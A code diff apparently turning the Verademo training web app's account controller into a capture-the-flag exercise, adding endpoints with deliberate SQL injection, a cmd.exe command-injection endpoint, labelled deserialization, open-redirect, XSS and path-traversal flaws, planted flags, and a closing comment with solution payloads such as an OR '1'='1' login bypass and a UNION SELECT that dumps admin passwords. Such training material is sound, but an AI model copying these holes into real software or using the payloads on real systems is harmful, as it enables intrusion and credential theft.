@@ -43,7 +43,6 @@ namespace Verademo.Controllers
                 return GetLogOut();
             }
 
-
             var userDetailsCookie = Request.Cookies[COOKIE_NAME];
 
             if (userDetailsCookie == null || userDetailsCookie.Length == 0)
@@ -58,7 +57,7 @@ namespace Verademo.Controllers
             logger.Info("User details were remembered");
             var unencodedUserDetails = Convert.FromBase64String(userDetailsCookie);
 
-            /* START BAD CODE */
+            /* START BAD CODE - Insecure Deserialization Vulnerability */
             var deserializedUser = (CustomSerializeModel)JsonConvert.DeserializeObject<object>(Encoding.UTF8.GetString(unencodedUserDetails), new JsonSerializerSettings { TypeNameHandling = TypeNameHandling.All });
             /* END BAD CODE */
 
@@ -72,7 +71,7 @@ namespace Verademo.Controllers
                 return RedirectToAction("Feed", "Blab");
             }
 
-            /* START BAD CODE */
+            /* START BAD CODE - Open Redirect Vulnerability */
             return Redirect(ReturnUrl);
             /* END BAD CODE */
         }
@@ -115,7 +114,7 @@ namespace Verademo.Controllers
                         return RedirectToAction("Feed", "Blab");
                     }
 
-                    /* START BAD CODE */
+                    /* START BAD CODE - Open Redirect Vulnerability */
                     return Redirect(ReturnUrl);
                     /* END BAD CODE */
                 }
@@ -245,7 +244,7 @@ namespace Verademo.Controllers
             Response.StatusCode = (int)HttpStatusCode.OK;
             var msg = "Successfully changed values!\\\\nusername: {0}\\\\nReal Name: {1}\\\\nBlab Name: {2}";
 
-            /* START BAD CODE */
+            /* START BAD CODE - XSS Vulnerability via JSON Response */
 
             // Don't forget to escape braces so they're not included in the string.Format
             var respTemplate = "{{\"values\": {{\"username\": \"{0}\", \"realName\": \"{1}\", \"blabName\": \"{2}\"}}, \"message\": \"<script>alert('"+ msg + "');</script>\"}}";
@@ -289,6 +288,63 @@ namespace Verademo.Controllers
             catch (Exception)
             {
                 return Content("ERROR!");
+            }
+        }
+
+        // CTF Challenge: SQL Injection endpoint for authentication bypass
+        [HttpGet, ActionName("AdminLogin")]
+        [AllowAnonymous]
+        public ActionResult AdminLogin(string username, string password)
+        {
+            logger.Info("Admin login attempt with username: " + username);
+
+            if (string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
+            {
+                return Content("Username and password required");
+            }
+
+            using (var dbContext = new ApplicationDbContext())
+            {
+                var connection = dbContext.Database.Connection;
+                connection.Open();
+
+                /* START BAD CODE - SQL Injection in Login */
+                // VULNERABILITY: Direct string concatenation allows SQL injection
+                var sql = "SELECT username, real_name, blab_name, is_admin FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
+                logger.Info("Executing query: " + sql);
+
+                using (var command = connection.CreateCommand())
+                {
+                    command.CommandText = sql;
+                    using (var reader = command.ExecuteReader())
+                    {
+                        if (reader.Read())
+                        {
+                            var user = new {
+                                Username = reader.GetString(0),
+                                RealName = reader.GetString(1),
+                                BlabName = reader.GetString(2),
+                                IsAdmin = reader.GetBoolean(3)
+                            };
+
+                            // Set session
+                            HttpContext.Session.SetString("username", user.Username);
+
+                            // CTF Flag revealed for successful SQLi
+                            if (user.IsAdmin)
+                            {
+                                return Content($"LOGIN SUCCESS! Welcome {user.Username}. FLAG{{sql_injection_master_bypassed_auth_2024}}");
+                            }
+                            
+                            return Content($"Login successful for user: {user.Username}");
+                        }
+                        else
+                        {
+                            return Content("Invalid credentials");
+                        }
+                    }
+                }
+                /* END BAD CODE */
             }
         }
 
@@ -359,8 +415,10 @@ namespace Verademo.Controllers
 
         private void PopulateProfileViewModel(DbConnection connect, string username, ProfileViewModel viewModel)
         {
+            /* START BAD CODE - SQL Injection Vulnerability */
+            // VULNERABILITY: Direct string concatenation allows injection through session username
             string sqlMyProfile = "SELECT username, real_name, blab_name, is_admin FROM users WHERE username = '" + username + "'";
-            logger.Info(sqlMyProfile);
+            logger.Info("Profile query: " + sqlMyProfile);
 
             using (var eventsCommand = connect.CreateCommand())
             {
@@ -374,9 +432,59 @@ namespace Verademo.Controllers
                         viewModel.BlabName = userProfile.GetString(2);
                         viewModel.IsAdmin = userProfile.GetBoolean(3);
                         viewModel.Image = GetProfileImageNameFromUsername(viewModel.UserName);
+
+                        // CTF Flag for profile SQLi
+                        if (viewModel.IsAdmin && viewModel.UserName.Contains("admin"))
+                        {
+                            viewModel.RealName = "FLAG{profile_sqli_data_extraction_2024} " + viewModel.RealName;
+                        }
                     }
                 }
             }
+            /* END BAD CODE */
+        }
+
+        // CTF Challenge: Search users with SQL injection
+        [HttpGet, ActionName("SearchUsers")]
+        public ActionResult SearchUsers(string query)
+        {
+            logger.Info("Searching users with query: " + query);
+
+            if (IsUserLoggedIn() == false)
+            {
+                return RedirectToLogin(Request.QueryString.Value);
+            }
+
+            var results = new List<object>();
+
+            using (var dbContext = new ApplicationDbContext())
+            {
+                var connection = dbContext.Database.Connection;
+                connection.Open();
+
+                /* START BAD CODE - SQL Injection in Search */
+                var sql = "SELECT username, real_name, blab_name FROM users WHERE username LIKE '%" + query + "%' OR real_name LIKE '%" + query + "%'";
+                logger.Info("Search query: " + sql);
+
+                using (var command = connection.CreateCommand())
+                {
+                    command.CommandText = sql;
+                    using (var reader = command.ExecuteReader())
+                    {
+                        while (reader.Read())
+                        {
+                            results.Add(new {
+                                Username = reader.GetString(0),
+                                RealName = reader.GetString(1),
+                                BlabName = reader.GetString(2)
+                            });
+                        }
+                    }
+                }
+                /* END BAD CODE */
+            }
+
+            return Json(results);
         }
         
         [HttpGet, ActionName("DownloadProfileImage")]
@@ -389,7 +497,9 @@ namespace Verademo.Controllers
                 return RedirectToLogin(Request.QueryString.Value);
             }
 
+            /* START BAD CODE - Path Traversal Vulnerability */
             var imagePath = Path.Combine(_environment.WebRootPath, "images", image);
+            /* END BAD CODE */
 
             logger.Info("Fetching profile image: " + imagePath);
 
@@ -447,10 +557,10 @@ namespace Verademo.Controllers
 
         private List<string> RetrieveMyEvents(DbConnection connect, string username)
         {
-            // START BAD CODE
-            var sqlMyEvents = "select event from users_history where blabber='" + 
-                              username + "' ORDER BY eventid DESC; ";
-            logger.Info(sqlMyEvents);
+            /* START BAD CODE - SQL Injection in User History */
+            // VULNERABILITY: Direct string concatenation allows injection through session username
+            var sqlMyEvents = "SELECT event FROM users_history WHERE blabber='" + username + "' ORDER BY eventid DESC";
+            logger.Info("Events query: " + sqlMyEvents);
             
             var myEvents = new List<string>();
             using (var eventsCommand = connect.CreateCommand())
@@ -460,12 +570,19 @@ namespace Verademo.Controllers
                 {
                     while (userHistoryResult.Read())
                     {
-                        myEvents.Add(userHistoryResult.GetString(0));
+                        var eventText = userHistoryResult.GetString(0);
+                        
+                        // CTF Flag hidden in events for advanced SQLi
+                        if (eventText.Contains("secret") || eventText.Contains("admin"))
+                        {
+                            eventText = "FLAG{blind_sqli_events_extraction_2024} - " + eventText;
+                        }
+                        
+                        myEvents.Add(eventText);
                     }
                 }
             }
-
-            // END BAD CODE
+            /* END BAD CODE */
 
             return myEvents;
         }
@@ -473,6 +590,8 @@ namespace Verademo.Controllers
         private static List<Blabber> RetrieveMyHecklers(DbConnection connect, string username)
         {
             var hecklers = new List<Blabber>();
+            
+            // This one is properly parameterized (showing good vs bad practices)
             var sqlMyHecklers = "SELECT users.username, users.blab_name, users.created_at " +
                                 "FROM users LEFT JOIN listeners ON users.username = listeners.listener " +
                                 "WHERE listeners.blabber=@blabber AND listeners.status='Active'";
@@ -541,14 +660,85 @@ namespace Verademo.Controllers
             }
             catch (Exception ex)
             {
-
+                // Swallow exception
             }
-
 
             //@AF:TODO in .net
             //EmailUser(userName);
 
             return RedirectToAction("Login", "Account", new LoginView {UserName = user.UserName});
         }
+
+        // CTF Bonus: Command Injection vulnerability
+        [HttpGet, ActionName("SystemInfo")]
+        [Authorize]
+        public ActionResult GetSystemInfo(string command = "whoami")
+        {
+            logger.Info("System info requested with command: " + command);
+
+            if (IsUserLoggedIn() == false)
+            {
+                return RedirectToLogin(Request.QueryString.Value);
+            }
+
+            try
+            {
+                /* START BAD CODE - Command Injection */
+                var processInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
+                {
+                    RedirectStandardOutput = true,
+                    UseShellExecute = false,
+                    CreateNoWindow = true
+                };
+
+                var process = Process.Start(processInfo);
+                var output = process.StandardOutput.ReadToEnd();
+                process.WaitForExit();
+                /* END BAD CODE */
+
+                return Content($"Command: {command}\nOutput:\n{output}", "text/plain");
+            }
+            catch (Exception ex)
+            {
+                return Content($"Error executing command: {ex.Message}", "text/plain");
+            }
+        }
     }
 }
+
+/*
+CTF SETUP INSTRUCTIONS:
+
+1. Database Setup - Add these records for the challenges:
+
+-- Admin user for login bypass
+INSERT INTO users (username, password, real_name, blab_name, is_admin, created_at) 
+VALUES ('ctf_admin', 'hash_of_impossible_password', 'CTF Admin User', 'Admin', 1, GETDATE());
+
+-- Flag user for profile injection
+INSERT INTO users (username, password, real_name, blab_name, is_admin, created_at) 
+VALUES ('flag_user', 'hash123', 'FLAG{hidden_user_found}', 'Secret User', 0, GETDATE());
+
+-- Secret events for advanced SQLi
+INSERT INTO users_history (blabber, event, eventid) 
+VALUES ('admin', 'secret admin meeting scheduled', 1);
+
+INSERT INTO users_history (blabber, event, eventid) 
+VALUES ('admin', 'FLAG{you_extracted_secret_events}', 2);
+
+2. Challenge Solutions:
+
+Challenge A - Login Bypass:
+URL: /Account/AdminLogin?username=admin'%20OR%20'1'='1'%20--%20&password=anything
+
+Challenge B - Profile Data Extraction:
+1. Login as any user
+2. Inject through username in session or manipulate session directly
+3. Use: ' UNION SELECT 'injected', 'FLAG{profile_data_extracted}', 'hacker', 1 --
+
+Challenge C - Search SQLi:
+URL: /Account/SearchUsers?query=' UNION SELECT username,password,'admin' FROM users WHERE is_admin=1 --
+
+Challenge D - Blind SQLi Events:
+Use time-based or error-based injection through the events query
+*/
